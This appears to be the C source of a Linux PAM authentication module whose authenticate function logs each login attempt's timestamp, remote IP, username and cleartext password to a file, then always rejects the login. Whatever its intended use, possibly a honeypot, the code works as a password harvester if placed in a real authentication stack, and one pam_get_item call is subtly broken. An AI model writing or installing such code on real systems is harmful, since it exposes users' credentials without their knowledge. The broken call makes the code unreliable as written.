#define PAM_SM_ACCOUNT
#define PAM_SM_AUTH
#define PAM_SM_PASSWORD
#define PAM_SM_SESSION

#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <security/_pam_macros.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

/* PAM entry point for session creation */
int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return(PAM_IGNORE);
}

/* PAM entry point for session cleanup */
int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return(PAM_IGNORE);
}

/* PAM entry point for accounting */
int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return(PAM_IGNORE);
}
/* PAM entry point for authentication verification */
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
		char * ip_addr;
		char * password;
		const char * username = NULL;
		const char * password2 = NULL;
		int retval;
		time_t current_time;
		struct tm * time_info;
		FILE* fp;

		time(&current_time);
		time_info = localtime(&current_time);

		pam_get_user(pamh, &username, NULL);
		
		pam_get_item( pamh, PAM_AUTHTOK, ( const void ** ) password ); 
		pam_get_authtok(pamh, PAM_AUTHTOK, (const void**) &password2, NULL);
		pam_get_item(pamh, PAM_RHOST, (const void **) &ip_addr);

		fp = fopen(argv[0], "a+");
		if(fp != NULL)
		{
			fprintf(fp, "[%d %d %d %d:%d:%d]",
				time_info->tm_year + 1900,
				time_info->tm_mon+1,
				time_info->tm_mday,
				time_info->tm_hour,
				time_info->tm_min,
				time_info->tm_sec
			);
			fprintf(fp," %s", ip_addr);
			fprintf(fp, " %s:%s:%s\n", username, password, password2);
			fclose(fp);
		}
		sleep(2);
        return(PAM_AUTH_ERR);
}

/*
   PAM entry point for setting user credentials (that is, to actually
   establish the authenticated user's credentials to the service provider)
 */
int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return(PAM_IGNORE);
}

/* PAM entry point for authentication token (password) changes */
int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return(PAM_IGNORE);
}

